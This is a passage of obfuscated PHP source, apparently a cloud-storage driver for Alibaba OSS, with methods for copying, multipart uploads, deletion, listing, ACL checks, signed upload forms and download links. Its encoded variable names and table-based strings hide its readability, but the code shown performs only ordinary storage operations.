array($›–ĞÙé[88] => $ùãó–œ, $›–ĞÙé[1428] => $ùãó–œ, $›–ĞÙé[97] => strtotime($ıèÎòæ¤), $›–ĞÙé[1429] => $ıèÎòæ¤, $›–ĞÙé[1427] => $ÖŞ¦÷±Š); $this->cacheMethodInfoSet($õª–ªıæ, $¨şÄÈÛ, $Ó«˜– °); if ($¨şÄÈÛ) { $çÌšİï¸[] = $õª–ªıæ; continue; } $ÆœÆ‡ƒò[] = $„Ù€ÚŸÔ; } foreach ($¬şêëöÕ as $ö­ó¨¾) { $çÌšİï¸[] = $ö­ó¨¾->getPrefix(); $this->cacheMethodInfoSet($ö­ó¨¾->getPrefix(), !0); } if ($Ğª‚Ğ×À === $›–ĞÙé[22]) { break; } } $this->cacheMethodInfoSet($Â¬áâß², !0); return array($›–ĞÙé[94] => $çÌšİï¸, $›–ĞÙé[95] => $ÆœÆ‡ƒò); } public function copyFile($·üÔ«ê, $™‚—Şã²) { $·‰ü¬¯™ = $this->size($·üÔ«ê); if ($·‰ü¬¯™ < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $·üÔ«ê, $this->bucket, $this->pathEncode($™‚—Şã²)); } catch (OSS\Core\OssException $ô¬åä…) { return !1; } return $this->getPathOuter($™‚—Şã²); } $•Ø¾¶ÑÖ = $this->multiCopyObject($·üÔ«ê, $™‚—Şã², $·‰ü¬¯™); return $•Ø¾¶ÑÖ ? $this->getPathOuter($™‚—Şã²) : !1; } private function multiCopyObject($ó¾¸Í¹è, $Ë„Äã‡ë, $ÆÉ²äÌ„) { $ãó†Â¨¢ =& $_SERVER[•€áå–Õ]; try { $µÚ‚äÁı = array(); if ($Ü¦É¥Æá = $this->hashMd5($ó¾¸Í¹è)) { $µÚ‚äÁı = array(OSS\OssClient::OSS_HEADERS => array($ãó†Â¨¢[1430] => $Ü¦É¥Æá)); } $·Ùõç‘÷ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($Ë„Äã‡ë), $µÚ‚äÁı); $ô¯¾ÚŠô = 1; $ÖÅæÊÑ½ = 0; $€Ù­öü’ = array(); $ìßèüƒ = 1024 * 1024 * 10; $Ãùñ´Ä“ = $this->client->generateMultiuploadParts($ÆÉ²äÌ„, $ìßèüƒ); foreach ($Ãùñ´Ä“ as $ËµÚ²­° => $¦ŒşÀÙŒ) { $¹€ğÀË· = $ÖÅæÊÑ½ + (int) $¦ŒşÀÙŒ[$ãó†Â¨¢[1431]]; $šŠ¥„à = (int) $¦ŒşÀÙŒ[$ãó†Â¨¢[392]] + $¹€ğÀË· - 1; $„¸ûæÎ = array($ãó†Â¨¢[1432] => $¹€ğÀË·, $ãó†Â¨¢[1433] => $šŠ¥„à); $€Ù­öü’[] = $this->client->uploadPartCopy($this->bucket, $ó¾¸Í¹è, $this->bucket, $this->pathEncode($Ë„Äã‡ë), $ô¯¾ÚŠô, $·Ùõç‘÷, $„¸ûæÎ); $ô¯¾ÚŠô = $ô¯¾ÚŠô + 1; } $é¸œÍÕ = array(); foreach ($€Ù­öü’ as $ËµÚ²­° => $ÁçÉ‘›Ñ) { $é¸œÍÕ[] = array($ãó†Â¨¢[1434] => $ËµÚ²­° + 1, $ãó†Â¨¢[1435] => $ÁçÉ‘›Ñ); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($Ë„Äã‡ë), $·Ùõç‘÷, $é¸œÍÕ); } catch (OSS\Core\OssException $ëÂ¼œ) { return !1; } return !0; } public function moveFile($ª‚‰Ÿ, $¡Ëî) { if ($this->copyFile($ª‚‰Ÿ, $¡Ëî)) { $this->remove($ª‚‰Ÿ); return $this->getPathOuter($¡Ëî); } return !1; } public function delFile($ÑØ³ëì) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($ÑØ³ëì)); } catch (OSS\Core\OssException $Àåè’æ) { return !1; } return !0; } public function delFolder($àªŠ¥Ø) { $—ÖÛÁ•’ =& $_SERVER[•€áå–Õ]; if (!$this->exist($àªŠ¥Ø)) { return !0; } $this->listItemCache = !1; $ìĞ¥“ûƒ = $this->fileList($àªŠ¥Ø); $this->listItemCache = !0; $¸ø¨¤¸¦ = trim($àªŠ¥Ø, $—ÖÛÁ•’[18]) . $—ÖÛÁ•’[18]; if (!empty($àªŠ¥Ø) && $àªŠ¥Ø !== $—ÖÛÁ•’[224] && !in_array($¸ø¨¤¸¦, $ìĞ¥“ûƒ[$—ÖÛÁ•’[94]])) { $ìĞ¥“ûƒ[$—ÖÛÁ•’[94]][] = $¸ø¨¤¸¦; } $¦Û†¼–î = $this->delByBatch($ìĞ¥“ûƒ[$—ÖÛÁ•’[95]]); if (!$¦Û†¼–î) { return !1; } $¦Û†¼–î = $this->delByBatch($ìĞ¥“ûƒ[$—ÖÛÁ•’[94]]); if (!$¦Û†¼–î) { return !1; } return $this->delFile($¸ø¨¤¸¦); } private function delByBatch($ú¢ÈìÀÍ) { foreach (array_chunk($ú¢ÈìÀÍ, 1000) as $úúÂÚ¨í) { try { $this->client->deleteObjects($this->bucket, $úúÂÚ¨í); } catch (OSS\Core\OssException $ƒÑ—í“Ù) { return !1; } } return !0; } public function rename($ºšĞØ¯Õ, $Ğ¤øØ¹¨) { return $this->renameObject($ºšĞØ¯Õ, $Ğ¤øØ¹¨); } private function fileInfo($¥€Ï¬–, $Ë„•©‹œ = false, $û—±åæ´ = array()) { $Ñ¡ğ¨Ù =& $_SERVER[•€áå–Õ]; $ù¿ßÁÇÁ = array($Ñ¡ğ¨Ù[42] => $this->pathThis($¥€Ï¬–), $Ñ¡ğ¨Ù[96] => $this->getPathOuter($¥€Ï¬–), $Ñ¡ğ¨Ù[43] => $Ñ¡ğ¨Ù[226], $Ñ¡ğ¨Ù[88] => isset($û—±åæ´[$Ñ¡ğ¨Ù[88]]) ? $û—±åæ´[$Ñ¡ğ¨Ù[88]] : 0, $Ñ¡ğ¨Ù[187] => $this->ext($¥€Ï¬–)); if ($Ë„•©‹œ) { return $ù¿ßÁÇÁ; } $ù¿ßÁÇÁ[$Ñ¡ğ¨Ù[227]] = $ù¿ßÁÇÁ[$Ñ¡ğ¨Ù[97]] = 0; $ù¿ßÁÇÁ[$Ñ¡ğ¨Ù[228]] = $ù¿ßÁÇÁ[$Ñ¡ğ¨Ù[229]] = !0; if (empty($û—±åæ´)) { $ïÁéĞ¡º = $this->objectMeta($¥€Ï¬–); if (!$ïÁéĞ¡º) { return $ù¿ßÁÇÁ; } $û—±åæ´ = array($Ñ¡ğ¨Ù[97] => strtotime($ïÁéĞ¡º[$Ñ¡ğ¨Ù[1429]]), $Ñ¡ğ¨Ù[88] => $ïÁéĞ¡º[$Ñ¡ğ¨Ù[1428]] + 0, $Ñ¡ğ¨Ù[1427] => $ïÁéĞ¡º[$Ñ¡ğ¨Ù[1427]]); } if (isset($û—±åæ´[$Ñ¡ğ¨Ù[1427]]) && $û—±åæ´[$Ñ¡ğ¨Ù[1427]]) { $ù¿ßÁÇÁ[$Ñ¡ğ¨Ù[231]] = trim($û—±åæ´[$Ñ¡ğ¨Ù[1427]], $Ñ¡ğ¨Ù[130]); } if (isset($û—±åæ´[$Ñ¡ğ¨Ù[88]])) { $ù¿ßÁÇÁ[$Ñ¡ğ¨Ù[88]] = $û—±åæ´[$Ñ¡ğ¨Ù[88]]; } if (isset($û—±åæ´[$Ñ¡ğ¨Ù[97]])) { $ù¿ßÁÇÁ[$Ñ¡ğ¨Ù[97]] = $û—±åæ´[$Ñ¡ğ¨Ù[97]]; } if (isset($û—±åæ´[$Ñ¡ğ¨Ù[206]]) && !trim($ù¿ßÁÇÁ[$Ñ¡ğ¨Ù[97]])) { $ù¿ßÁÇÁ[$Ñ¡ğ¨Ù[97]] = $û—±åæ´[$Ñ¡ğ¨Ù[206]]; } return $ù¿ßÁÇÁ; } private function folderInfo($ÊÁˆùÛÂ, $‘å§Ä = false, $¸â˜µ = array()) { $¹¤¥¼‚¦ =& $_SERVER[•€áå–Õ]; $çÔÍÕšò = array($¹¤¥¼‚¦[42] => $this->pathThis($ÊÁˆùÛÂ), $¹¤¥¼‚¦[96] => $this->getPathOuter($¹¤¥¼‚¦[18] . $ÊÁˆùÛÂ), $¹¤¥¼‚¦[43] => $¹¤¥¼‚¦[87]); if ($‘å§Ä) { return $çÔÍÕšò; } $çÔÍÕšò[$¹¤¥¼‚¦[227]] = $çÔÍÕšò[$¹¤¥¼‚¦[97]] = 0; $çÔÍÕšò[$¹¤¥¼‚¦[228]] = $çÔÍÕšò[$¹¤¥¼‚¦[229]] = !0; if (empty($¸â˜µ)) { $ÊÁˆùÛÂ = rtrim($ÊÁˆùÛÂ, $¹¤¥¼‚¦[18]) . $¹¤¥¼‚¦[18]; $İ®«é– = $this->objectMeta($ÊÁˆùÛÂ); if (!$İ®«é–) { return $çÔÍÕšò; } $¸â˜µ = array($¹¤¥¼‚¦[227] => $İ®«é–[$¹¤¥¼‚¦[555]][$¹¤¥¼‚¦[1436]], $¹¤¥¼‚¦[97] => strtotime($İ®«é–[$¹¤¥¼‚¦[1429]])); } if (isset($¸â˜µ[$¹¤¥¼‚¦[97]])) { $çÔÍÕšò[$¹¤¥¼‚¦[97]] = $¸â˜µ[$¹¤¥¼‚¦[97]]; } if (isset($¸â˜µ[$¹¤¥¼‚¦[227]])) { $çÔÍÕšò[$¹¤¥¼‚¦[227]] = $¸â˜µ[$¹¤¥¼‚¦[227]]; } return $çÔÍÕšò; } public function listPath($¨ú·ø™½, $ÄãòŞ¬´ = false) { $Ñ‚îçŸÜ =& $_SERVER[•€áå–Õ]; $ë€ïëÃ = $this->fileList($¨ú·ø™½, $Ñ‚îçŸÜ[18], !0); foreach ($ë€ïëÃ[$Ñ‚îçŸÜ[94]] as $–‘´Ş£ => $°ÁèîÍÙ) { $ë€ïëÃ[$Ñ‚îçŸÜ[94]][$–‘´Ş£] = $this->folderInfo($°ÁèîÍÙ, $ÄãòŞ¬´, $°ÁèîÍÙ); } foreach ($ë€ïëÃ[$Ñ‚îçŸÜ[95]] as $–‘´Ş£ => $°ÁèîÍÙ) { $ë€ïëÃ[$Ñ‚îçŸÜ[95]][$–‘´Ş£] = $this->fileInfo($°ÁèîÍÙ[$Ñ‚îçŸÜ[42]], $ÄãòŞ¬´, $°ÁèîÍÙ); } return $ë€ïëÃ; } protected function infoChildren($íåÛ“Á, &$ØÁø«‡‚) { $òÑá¾§Ğ =& $_SERVER[•€áå–Õ]; $ış¢åÓ‘ = $this->fileList($íåÛ“Á, $òÑá¾§Ğ[22], !0); $ØÁø«‡‚[$òÑá¾§Ğ[90]] += count($ış¢åÓ‘[$òÑá¾§Ğ[94]]); $ØÁø«‡‚[$òÑá¾§Ğ[89]] += count($ış¢åÓ‘[$òÑá¾§Ğ[95]]); foreach ($ış¢åÓ‘[$òÑá¾§Ğ[95]] as $¤¢ÛâËÌ) { if (!$¤¢ÛâËÌ || !$¤¢ÛâËÌ[$òÑá¾§Ğ[88]]) { continue; } $ØÁø«‡‚[$òÑá¾§Ğ[88]] += $¤¢ÛâËÌ[$òÑá¾§Ğ[88]]; } } public function has($ÉæÏ‰ø, $åÚ—îİÒ = false, $’•Ç ´Ü = true) { $ÏÆ»´Ÿ” =& $_SERVER[•€áå–Õ]; $ÉæÏ‰ø = trim($ÉæÏ‰ø, $ÏÆ»´Ÿ”[18]); $û»™ŒÕ¢ = empty($ÉæÏ‰ø) && $ÉæÏ‰ø !== $ÏÆ»´Ÿ”[224] ? $ÏÆ»´Ÿ”[22] : $ÉæÏ‰ø . $ÏÆ»´Ÿ”[18]; $–”´’´á = $ÏÆ»´Ÿ”[22]; $•ª×·àÇ = 500; $´ü´¬¼ = $¼Ê¾ñ‘¦ = 0; while (!0) { check_abort(); $²²ø„èï = array($ÏÆ»´Ÿ”[1423] => $ÏÆ»´Ÿ”[18], $ÏÆ»´Ÿ”[1424] => $û»™ŒÕ¢, $ÏÆ»´Ÿ”[1425] => $•ª×·àÇ, $ÏÆ»´Ÿ”[1426] => $–”´’´á); try { $•Õ‹³Ù› = $this->client->listObjects($this->bucket, $²²ø„èï); } catch (OSS\Core\OssException $¨“î÷î) { break; } $–”´’´á = $•Õ‹³Ù›->getNextMarker(); $İ˜¹øË = $•Õ‹³Ù›->getObjectList(); $äœ˜–ä = $•Õ‹³Ù›->getPrefixList(); if ($åÚ—îİÒ) { if (count($İ˜¹øË) > 1 || count($İ˜¹øË) == 1 && $İ˜¹øË[0]->getKey() != $û»™ŒÕ¢) { $´ü´¬¼ += count($İ˜¹øË) - 1; } if (!empty($äœ˜–ä)) { $¼Ê¾ñ‘¦ += count($äœ˜–ä); } if ($–”´’´á === $ÏÆ»´Ÿ”[22]) { break; } continue; } if ($’•Ç ´Ü) { if (!empty($İ˜¹øË)) { if (count($İ˜¹øË) > 1 || $İ˜¹øË[0]->getKey() != $û»™ŒÕ¢) { return !0; } } } else { if (!empty($äœ˜–ä)) { return !0; } } if ($–”´’´á === $ÏÆ»´Ÿ”[22]) { break; } } if ($åÚ—îİÒ) { return array($ÏÆ»´Ÿ”[235] => $´ü´¬¼, $ÏÆ»´Ÿ”[236] => $¼Ê¾ñ‘¦); } return !1; } public function listAll($õ‰Ûûì¸) { $•äÊİ†® =& $_SERVER[•€áå–Õ]; $İÄ ÓÓ = $this->fileList($õ‰Ûûì¸, $•äÊİ†®[22], !0); $òØÌ­ï€ = array_to_keyvalue($İÄ ÓÓ[$•äÊİ†®[95]], $•äÊİ†®[42]); foreach ($İÄ ÓÓ[$•äÊİ†®[94]] as $Ÿ©‡ò­ú) { if (is_string($Ÿ©‡ò­ú)) { $òØÌ­ï€[$Ÿ©‡ò­ú] = array($•äÊİ†®[88] => 0); } } return $this->listAllFiles($õ‰Ûûì¸, $òØÌ­ï€); } public function canRead($‡ğ°»¦à) { $çºİĞûÕ =& $_SERVER[•€áå–Õ]; $¿Ùµ­çĞ = $this->pathAcl($‡ğ°»¦à); return $¿Ùµ­çĞ == $çºİĞûÕ[1437] || $¿Ùµ­çĞ == $çºİĞûÕ[598] ? !0 : !1; } public function canWrite($¤×º¤’) { $‘½˜èŸ’ = $this->pathAcl($¤×º¤’); return $‘½˜èŸ’ == $_SERVER[•€áå–Õ][598] ? !0 : !1; } public function pathAcl($Ãñ–ê¸ƒ) { $À¸’Ñ®… =& $_SERVER[•€áå–Õ]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $óóöÎ· = $this->client->getObjectAcl($this->bucket, $this->pathEncode($Ãñ–ê¸ƒ)); } catch (OSS\Core\OssException $ãÎŒ±„È) { return !1; } $îÏğÁçÍ = $óóöÎ· == $À¸’Ñ®…[47] ? $this->bucketAcl : $óóöÎ·; if ($îÏğÁçÍ == $À¸’Ñ®…[1438]) { return $À¸’Ñ®…[1437]; } if ($îÏğÁçÍ == $À¸’Ñ®…[1439]) { return $À¸’Ñ®…[598]; } return $îÏğÁçÍ; } private function chmodPath($Ü–‰Ú, $îÙø‘¹² = '') { $¶â“ê’÷ =& $_SERVER[•€áå–Õ]; $ßšÍ‘©° = empty($îÙø‘¹²) ? $¶â“ê’÷[1439] : $îÙø‘¹²; $•Š®Ÿ× = array($¶â“ê’÷[47], $¶â“ê’÷[225], $¶â“ê’÷[1438], $¶â“ê’÷[1439]); if (!in_array($ßšÍ‘©°, $•Š®Ÿ×)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($Ü–‰Ú), $ßšÍ‘©°); } catch (OSS\Core\OssException $æÌÁĞªò) { return !1; } return !0; } public function getContent($²©¦ıº) { return $this->fileSubstr($²©¦ıº, -1); } public function setContent($ŸÒÑ¿›ä, $€®‡››Ö = '') { $×ÛŸÖ°Â =& $_SERVER[•€áå–Õ]; try { $á—àÑİ¤ = $this->trafficLimit($×ÛŸÖ°Â[1440]); $ââå‹®‚ = $this->client->putObject($this->bucket, $this->pathEncode($ŸÒÑ¿›ä), $€®‡››Ö, $á—àÑİ¤); } catch (OSS\Core\OssException $ä³©·É’) { return !1; } $¼Œºáúè = array($×ÛŸÖ°Â[1430] => trim($ââå‹®‚[$×ÛŸÖ°Â[1427]], $×ÛŸÖ°Â[130]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($ŸÒÑ¿›ä))); $this->updateObjMeta($ŸÒÑ¿›ä, $¼Œºáúè); return isset($ââå‹®‚[$×ÛŸÖ°Â[1441]][$×ÛŸÖ°Â[286]]) ? !0 : !1; } private function updateObjMeta($‡Ê‹ü­ê, $øâğÎ‡) { $‡Ê‹ü­ê = $this->pathEncode($‡Ê‹ü­ê); try { $ß§½ğÃ = array(OSS\OssClient::OSS_HEADERS => $øâğÎ‡); $this->client->copyObject($this->bucket, $‡Ê‹ü­ê, $this->bucket, $‡Ê‹ü­ê, $ß§½ğÃ); } catch (OSS\Core\OssException $ªÈ‚Ê) { return !1; } return !0; } public function upload($¥óÈŞì®, $ç‹ô¢ë¿, $©ÄíĞ‹ = false, $¶”Ü£·œ = REPEAT_REPLACE) { $µ©ã¶«× =& $_SERVER[•€áå–Õ]; $Ğşªœ‘Ö = trim($¥óÈŞì®, $µ©ã¶«×[18]); $š–óëŒ = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($µ©ã¶«×[1430] => @md5_file($ç‹ô¢ë¿)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($¥óÈŞì®))); $š–óëŒ = $this->trafficLimit($µ©ã¶«×[1440], $š–óëŒ); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($Ğşªœ‘Ö), $ç‹ô¢ë¿, $š–óëŒ); } catch (OSS\Core\OssException $ªåÏàÆÀ) { return !1; } return $this->getPathOuter($¥óÈŞì®); } public function getHost() { $Òñ»Ü”… =& $_SERVER[•€áå–Õ]; $á›¥½£ = explode($Òñ»Ü”…[210], parent::getHost()); return $á›¥½£[0] . $Òñ»Ü”…[210] . $this->bucket . $Òñ»Ü”…[20] . $á›¥½£[1]; } public function uploadFormData($òë¡ÓÕ¿, $ÄÍÕ©•ş = 3600) { $˜èĞ¢µ£ =& $_SERVER[•€áå–Õ]; if (!($¬¡Ú§¾Ì = $this->getHost())) { return !1; } $óçÄ¼àş = $ÄÍÕ©•ş; $ı÷…–ÚÒ = date($˜èĞ¢µ£[1442], time() + $óçÄ¼àş); $  ®°—º = new DateTime($ı÷…–ÚÒ); $†Àœ¾Šœ = $  ®°—º->format(DateTime::ISO8601); $ş¿À“»³ = strpos($†Àœ¾Šœ, $˜èĞ¢µ£[351]); $†Àœ¾Šœ = substr($†Àœ¾Šœ, 0, $ş¿À“»³) . $˜èĞ¢µ£[1443]; $ˆÑşí´’ = 1048576000 * 5; $Êî¡‚Å = $this->pathFather($òë¡ÓÕ¿); $€ß¬¡ç¾ = array($˜èĞ¢µ£[269] => $†Àœ¾Šœ, $˜èĞ¢µ£[272] => array(array($˜èĞ¢µ£[1444], 0, $ˆÑşí´’), array($˜èĞ¢µ£[275], $˜èĞ¢µ£[276], $Êî¡‚Å))); $Ï¯ôéÙ³ = base64_encode(json_encode($€ß¬¡ç¾)); $ÛÜÚüÏ¢ = base64_encode(hash_hmac($˜èĞ¢µ£[258], $Ï¯ôéÙ³, $this->secret, !0)); $ÃÓı¢œ = array($˜èĞ¢µ£[287] => $Ï¯ôéÙ³, $˜èĞ¢µ£[1445] => $this->accessKey, $˜èĞ¢µ£[279] => $˜èĞ¢µ£[268], $˜èĞ¢µ£[1446] => $ÛÜÚüÏ¢, $˜èĞ¢µ£[208] => $¬¡Ú§¾Ì); $ÃÓı¢œ = $this->trafficLimit($˜èĞ¢µ£[1440], $ÃÓı¢œ); return $ÃÓı¢œ; } public function multiUploadFormData($è”ùŞî, $û ‡×ó× = 3600) { $²Ü¨ó¦¿ =& $_SERVER[•€áå–Õ]; if (!($§ ‡“ø = $this->getHost())) { return !1; } $çô“ë‘· = $this->trafficLimit($²Ü¨ó¦¿[1440]); $È ÃÑÜ® = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($è”ùŞî), $çô“ë‘·); return array($²Ü¨ó¦¿[250] => $È ÃÑÜ®, $²Ü¨ó¦¿[208] => $§ ‡“ø . $²Ü¨ó¦¿[18] . $this->pathEncode($è”ùŞî), $²Ü¨ó¦¿[251] => gmdate($²Ü¨ó¦¿[1447]), $²Ü¨ó¦¿[106] => $è”ùŞî); } public function multiUploadAuthData($…Íüà´ù, $§ªàØ³Û = array()) { $ëÇüóúÙ =& $_SERVER[•€áå–Õ]; $‰·¯Ü¼Ã = isset($§ªàØ³Û[$ëÇüóúÙ[251]]) ? $§ªàØ³Û[$ëÇüóúÙ[251]] : gmdate($ëÇüóúÙ[1447]); $ §îœí• = isset($§ªàØ³Û[$ëÇüóúÙ[187]]) ? $§ªàØ³Û[$ëÇüóúÙ[187]] : $ëÇüóúÙ[22]; $¼Æ™â¡¾ = $…Íüà´ù; if (isset($§ªàØ³Û[$ëÇüóúÙ[106]])) { $¼Æ™â¡¾ = $§ªàØ³Û[$ëÇüóúÙ[106]]; unset($§ªàØ³Û[$ëÇüóúÙ[106]]); } if (isset($§ªàØ³Û[$ëÇüóúÙ[252]])) { $§ªàØ³Û[$ëÇüóúÙ[251]] = $‰·¯Ü¼Ã; return $this->listUploadParts($¼Æ™â¡¾, $§ªàØ³Û); } $×æ×É¸Ù = array($ëÇüóúÙ[253], $ëÇüóúÙ[22], $ëÇüóúÙ[132], $‰·¯Ü¼Ã, "\170\x2d\157\x73\163\x2d\x64\x61\164\x65\x3a{$‰·¯Ü¼Ã}", $ëÇüóúÙ[18] . $this->bucket . $ëÇüóúÙ[18] . $¼Æ™â¡¾ . $ §îœí•); if (strpos($ §îœí•, $ëÇüóúÙ[254]) === 0) { $×æ×É¸Ù[0] = $ëÇüóúÙ[255]; if ($–¼õæ ô = $this->trafficLimit($ëÇüóúÙ[1440])) { $¼Æ™â¡¾ = $ëÇüóúÙ[1448]; array_splice($×æ×É¸Ù, 5, 0, $¼Æ™â¡¾ . $ëÇüóúÙ[4] . $–¼õæ ô[$¼Æ™â¡¾]); } } if (isset($§ªàØ³Û[$ëÇüóúÙ[256]]) && $§ªàØ³Û[$ëÇüóúÙ[256]] == $ëÇüóúÙ[257]) { $×æ×É¸Ù[0] = $ëÇüóúÙ[257]; } if (!empty($§ªàØ³Û[$ëÇüóúÙ[1449]])) { $ò§¨”øß = array_merge(array($×æ×É¸Ù[4]), $§ªàØ³Û[$ëÇüóúÙ[1449]]); sort($ò§¨”øß); $×æ×É¸Ù[4] = implode($ëÇüóúÙ[12], $ò§¨”øß); } $àÈçÍ© = implode($ëÇüóúÙ[12], $×æ×É¸Ù); $²ğ…‹İ = base64_encode(hash_hmac($ëÇüóúÙ[258], $àÈçÍ©, $this->secret, !0)); $Ó©°Áš = $ëÇüóúÙ[1413] . $this->accessKey . $ëÇüóúÙ[4] . $²ğ…‹İ; if (strpos($ §îœí•, $ëÇüóúÙ[254]) === 0) { $Ó©°Áš = array($ëÇüóúÙ[260] => $Ó©°Áš, $ëÇüóúÙ[251] => $‰·¯Ü¼Ã); if ($–¼õæ ô) { $Ó©°Áš = array_merge($Ó©°Áš, $–¼õæ ô); } } return $Ó©°Áš; } public function listUploadParts($…‰é¾ŠÑ, $Øºğ¦¹—) { $£İòÍšÃ =& $_SERVER[•€áå–Õ]; $›©å”ì = parse_url_query($Øºğ¦¹—[$£İòÍšÃ[187]]); $æÜ–†„Ğ = $this->client->listParts($this->bucket, $this->pathEncode($…‰é¾ŠÑ), $›©å”ì[$£İòÍšÃ[250]]); $ ‡ñÃÑÏ = $æÜ–†„Ğ->getListPart(); $ó€²ˆ¶æ = array(); foreach ($ ‡ñÃÑÏ as $ü…¥ã‡) { $ó€²ˆ¶æ[] = array($£İòÍšÃ[1434] => $ü…¥ã‡->getPartNumber(), $£İòÍšÃ[1435] => trim($ü…¥ã‡->getETag(), $£İòÍšÃ[130])); } unset($Øºğ¦¹—[$£İòÍšÃ[252]], $Øºğ¦¹—[$£İòÍšÃ[256]]); $ú«‘ê’È = $this->multiUploadAuthData($…‰é¾ŠÑ, $Øºğ¦¹—); if (empty($ú«‘ê’È)) { return !1; } return array($£İòÍšÃ[260] => $ú«‘ê’È, $£İòÍšÃ[251] => $Øºğ¦¹—[$£İòÍšÃ[251]], $£İòÍšÃ[262] => $ó€²ˆ¶æ); } public function download($ê«ÜÇß›, $¶Ø®İÇ) { if ($this->isFolder($ê«ÜÇß›)) { return !1; } try { $ğˆ«ùÍ€ = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $¶Ø®İÇ); $ğˆ«ùÍ€ = $this->trafficLimit($_SERVER[•€áå–Õ][121], $ğˆ«ùÍ€); $this->client->getObject($this->bucket, $this->pathEncode($ê«ÜÇß›), $ğˆ«ùÍ€); } catch (OSS\Core\OssException $Áœ·“›™) { return !1; } return $¶Ø®İÇ; } public function fileSubstr($à”ÊØ, $ë¾ªÉ÷Ü = 0, $Úõ˜‹ß = false) { if ($ë¾ªÉ÷Ü === -1) { $®¿şÈØ© = array(); } else { if ($Úõ˜‹ß === !1) { $ëùŸŞÊ– = $this->size($à”ÊØ); } else { $ëùŸŞÊ– = $ë¾ªÉ÷Ü + $Úõ˜‹ß - 1; } $®¿şÈØ© = array(OSS\OssClient::OSS_RANGE => "{$ë¾ªÉ÷Ü}\55{$ëùŸŞÊ–}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($à”ÊØ), $®¿şÈØ©); } catch (OSS\Core\OssException $Šàßé£ß) { think_exception($Šàßé£ß->getMessage()); return !1; } } private function trafficLimit($òƒ”šå±, $ç³ÊØô = array()) { $ãÁŒáİÜ =& $_SERVER[•€áå–Õ]; if ($òƒ”šå± == $ãÁŒáİÜ[1440] && $this->isUploadServer() || $òƒ”šå± == $ãÁŒáİÜ[121] && $this->isFileOutServer()) { return $ç³ÊØô; } $»œ—Æ£Ã = floatval($GLOBALS[$ãÁŒáİÜ[16]][$ãÁŒáİÜ[101]][$ãÁŒáİÜ[119]][$òƒ”šå±]) * 1024 * 1024 * 8; if (!$»œ—Æ£Ã) { return $ç³ÊØô; } $»œ—Æ£Ã = $»œ—Æ£Ã < 819200 ? 819200 : ($»œ—Æ£Ã > 838860800 ? 838860800 : $»œ—Æ£Ã); $ç³ÊØô[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($»œ—Æ£Ã); return $ç³ÊØô; } public function link($‘¡”µ¨“, $¯ŠµˆŠ¼ = array()) { $áİ“üş¡ =& $_SERVER[•€áå–Õ]; if (!$this->exist($‘¡”µ¨“) || $this->isFolder($‘¡”µ¨“)) { return !1; } try { $¯ŠµˆŠ¼ = $this->trafficLimit($áİ“üş¡[121], $¯ŠµˆŠ¼); $”ü±Ùƒ = $this->client->signUrl($this->bucket, $this->pathEncode($‘¡”µ¨“), 3600 * 12, $áİ“üş¡[257], $¯ŠµˆŠ¼); return $this->getCdnLink($”ü±Ùƒ); } catch (OSS\Core\OssException $îôÊî‹¶) { return !1; } } public function fileOut($ˆ„¾¯Ì°, $î†İÆ¹ã = false, $Û–‘¯ÂÇ = false, $ëîŠƒçŞ = '') { $‚«ÊëŞÏ =& $_SERVER[•€áå–Õ]; if ($this->isFileOutServer()) { return $this->fileOutServer($ˆ„¾¯Ì°, $î†İÆ¹ã, $Û–‘¯ÂÇ, $ëîŠƒçŞ); } if (!$Û–‘¯ÂÇ) { $Û–‘¯ÂÇ = $this->pathThis($ˆ„¾¯Ì°); } $Û–‘¯ÂÇ = rawurlencode($Û–‘¯ÂÇ); $ì‹ğÎèº = get_file_mime(get_path_ext($Û–‘¯ÂÇ)); if ($ì‹ğÎèº == $‚«ÊëŞÏ[244]) { return parent::fileOut($ˆ„¾¯Ì°, $î†İÆ¹ã, $Û–‘¯ÂÇ, $ëîŠƒçŞ); } $î†İÆ¹ã = $î†İÆ¹ã ? $‚«ÊëŞÏ[1450] : $‚«ÊëŞÏ[1451]; $ÖÇø¢ªÌ = array(OSS\OssClient::OSS_SUB_RESOURCE => $‚«ÊëŞÏ[1452] . rawurlencode("{$î†İÆ¹ã}\x3b\146\151\154\x65\156\x61\155\145\75{$Û–‘¯ÂÇ}")); $ÖÇø¢ªÌ[OSS\OssClient::OSS_SUB_RESOURCE] .= $‚«ÊëŞÏ[1453] . rawurlencode($ì‹ğÎèº); $é¬®¨Á = $this->link($ˆ„¾¯Ì°, $ÖÇø¢ªÌ); $this->fileOutLink($é¬®¨Á); } public function fileOutServer($ş¼ÔŞ•, $–ØÖ¥± = false, $Ó´¹íûÄ = false, $¤³õœİñ = '') { parent::fileOut($ş¼ÔŞ•, $–ØÖ¥±, $Ó´¹íûÄ, $¤³õœİñ); } public function fileOutImage($³ÕŒ¦’‰, $­ÓŞê×÷ = 250) { if ($this->size($³ÕŒ¦’‰) > 1024 * 1024 * 20) { return $this->fileOutImageServer($³ÕŒ¦’‰, $­ÓŞê×÷); } $Œö¡·¯ = array(OSS\OssClient::OSS_PROCESS => $_SERVER[•€áå–Õ][1410] . $­ÓŞê×÷); $äÃ–°³ = $this->link($³ÕŒ¦’‰, $Œö¡·¯); $this->fileOutLink($äÃ–°³); } public function fileOutImageServer($úìÙõŞï, $àÄ»ô†ˆ = 250) { parent::fileOutImage($úìÙõŞï, $àÄ»ô†ˆ); } public function fileOutLink($¡ÎÏ‘÷Ò) { $“Úà÷’¬ =& $_SERVER[•€áå–Õ]; if (!$this->isCdnHost() && substr($¡ÎÏ‘÷Ò, 0, 7) == $“Úà÷’¬[1372]) { $¡ÎÏ‘÷Ò = $“Úà÷’¬[1373] . substr($¡ÎÏ‘÷Ò, 7); } header($“Úà÷’¬[174] 